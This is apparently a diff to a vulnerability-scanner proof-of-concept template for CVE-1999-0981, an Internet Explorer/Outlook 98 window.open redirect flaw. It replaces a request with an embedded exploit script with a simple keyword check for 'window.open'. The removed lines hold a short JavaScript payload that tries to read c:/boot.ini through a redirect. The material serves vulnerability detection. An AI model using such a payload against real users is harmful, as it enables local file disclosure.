@@ -1,15 +1,10 @@
 [info]
-author = "AVE"
-description = "检测 Microsoft Internet Explorer 4/5 及 Outlook 98 服务器端页面引用重定向漏洞。通过 window.open 创建窗口引用后利用服务器端重定向绕过同源策略读取本地文件。"
+author = "ave"
+description = "检测目标页面是否包含利用 Microsoft Internet Explorer 5.01 及更早版本或 Outlook 98 的 window.open 服务器端重定向漏洞（CVE-1999-0981）的 JavaScript 代码，攻击者通过 window.open 创建窗口引用并结合服务器端重定向可访问客户端本地文件实现信息泄露"
 id = "POC-AVE-1999-0791"
-name = "CVE-1999-0981 PoC"
-severity = "medium"
-tags = [
-    "cve-1999-0981",
-    "ie",
-    "redirect",
-    "local-file-access",
-]
+name = "Microsoft IE/Outlook 98 window.open Redirect PoC"
+severity = "high"
+tags = ["ave-1999-0791"]
 vuln_id = [
     "CVE-1999-0981",
     "AVE-1999-0791",
@@ -20,22 +15,8 @@ logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/cve-1999-0981.html"
+path = "/{{BaseURL}}/"
 protocol = "http"
-
-[poc.requests.body]
-content = """
-<html>
-<body>
-<script>
-var w=window.open("/redirect?target=file:///c:/boot.ini");
-if(w.document && w.document.body) {
-  document.write("VULNERABLE:" + w.document.body.innerHTML);
-}
-</script>
-</body>
-</html>"""
-type = "raw"
 
 [poc.requests.headers]
 User-Agent = "AVE/1.0"
@@ -44,4 +25,4 @@ User-Agent = "AVE/1.0"
 expect = true
 part = "body"
 type = "word"
-words = ["VULNERABLE"]
+words = ["window.open"]
